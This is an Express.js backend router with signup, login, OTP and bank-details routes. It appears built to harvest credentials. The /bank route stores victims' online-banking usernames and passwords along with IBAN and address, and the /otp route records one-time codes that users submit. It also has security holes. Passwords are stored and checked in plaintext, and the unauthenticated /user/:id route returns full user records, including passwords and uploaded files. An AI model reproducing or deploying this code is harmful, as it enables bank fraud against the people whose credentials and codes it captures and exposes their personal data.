const express = require("express")
const router = express.Router()
const path = require("path")
const multer = require('multer');
const User = require("./schema/userSchema.js");
const jwt = require("jsonwebtoken");
const BankDetails = require("./schema/Bankschema.js");
const OTPModel = require("./schema/OTPSchema.js");




function GenerateToken(user){
  let token =  jwt.sign(user,process.env.URIPassword,{
    expiresIn :"1d"
  })
  return token
}
function verifyToken(req,res,next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "No token provided" });
  }

  const token = authHeader.split(" ")[1];

  try {
    const decoded = jwt.verify(token, process.env.URIPassword);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(403).json({ error: "Invalid or expired token" });
  }
}

const storage  = multer.memoryStorage({})
const upload = multer({ storage: storage });

router.post('/signup', upload.array('files', 10),async (req, res) => {
  try {
    console.log(req.hostname)
    const { FirstName, SecondName, OtherName , UserName, password, Email, dateofBirth } = req.body;
    const files = req.files;

    
    const filesData = files.map((file) => ({
      data: file.buffer,
      contentType: file.mimetype,
    }));
    const user  = {
      FirstName,
      SecondName,
      OtherName,
      UserName,
      Email,
      password, 
      dateofBirth,
      files: filesData,
    }
   
    const newUser = await  User.create(user);
    let _id = newUser._id
    const token =  GenerateToken({_id})
   
  
    res.json({ message: 'Logged in' ,id:_id,token});

  
    
  } catch (error) {
    console.error('Error creating user:', error);
    res.status(500).json({ error: 'Failed to create user' });
  }
  
    
  });
router.post("/login",async (req,res)=>{
  const {email,password} = req.body
    if(!email || !password){
      return res.json({error : "No email or Password"})
    }
    try{
      const user = await User.findOne({Email : email})
      if(!user)  { 
        return res.json({error : "No user found"})
      }
      if(user.password !== password) { 
        return res.json({error : "Incorrect password"})
      }
        let _id = user._id
       const token =  GenerateToken({_id})
    res.json({ message: 'Logged in' ,id:_id,token});
    }catch(err){
      console.log(err)
      res.status(404).json({error : "Invalid email or Password"})
    }
})
router.post("/otp",verifyToken,async(req,res)=>{
  const id = req.user._id
  console.log(id)
  const {OTP} = req.body
  try{
    const user = await User.findById(id)
    const ownerusername = user.UserName
    console.log(ownerusername)
    const otp = await OTPModel.create({ownerusername,OTP})
    res.json({message : "OTP received succesfully"})
  }catch(err){
    res.json({err:err})
    console.error(err)
  }
})
router.post("/verifytoken", verifyToken,(req,res)=>{
  res.json({message : "Done"})
});

router.get("/user/:id", async(req,res)=>{
  const {id} = req.params
  
  if(!id) res.json({error : "No ID"})  
  
    try{
        let user = await User.findById(id);
        res.json(user)
  }catch(err){
    res.json({error : err})
  }
})

router.post("/bank/:id", async(req,res)=>{
  const {id} = req.params
  const {phone ,country ,bank, iban  , username , password ,address} =  req.body
  if(!id) return res.json({error:"NO ID"})
    try{
      const user  = await User.findById(id)
      const ownerusername = user.UserName
      const BankAccount = await BankDetails.create({phone ,country ,bank, iban  , username , password ,address,ownerusername})
      res.json({message : "succesful", BankAccount : BankAccount})
  }catch(err){
    console.log(err);
    res.json({error : err})
  }
})

// router.get('/location', async (req, res) => {
//   let country;
//   try {
//     // Attempt to use an alternative IP geolocation service (ip-api.com)
//     const alternativeResponse = await fetch('http://ip-api.com/json');

//     if (alternativeResponse.ok) {
//         const data = await alternativeResponse.json();
//         country  = await data.country;
//         console.log('Successfully fetched from http://ip-api.com/json');
//         res.json(country);
//         return; // IMPORTANT: Return after successful response
//     }

//     // If the alternative API also fails, try the original one (ipapi.co) and handle errors
//     const response = await fetch('https://ipapi.co/json/');
//     if (!response.ok) {
//       // Check for 429 specifically
//       if (response.status === 429) {
//         throw new Error('Too Many Requests from ipapi.co. Please try again later.');
//       } else {
//         throw new Error(`HTTP error! status: ${response.status}`);
//       }
//     }
//     const text = await response.json();
//       res.json(text.country_name)
//   } catch (error) {
//     console.error('Error fetching location:', error);
//     res.status(500).json({ error: error.message || 'Failed to fetch location' }); // Include the error message
//   }
// });

module.exports = router
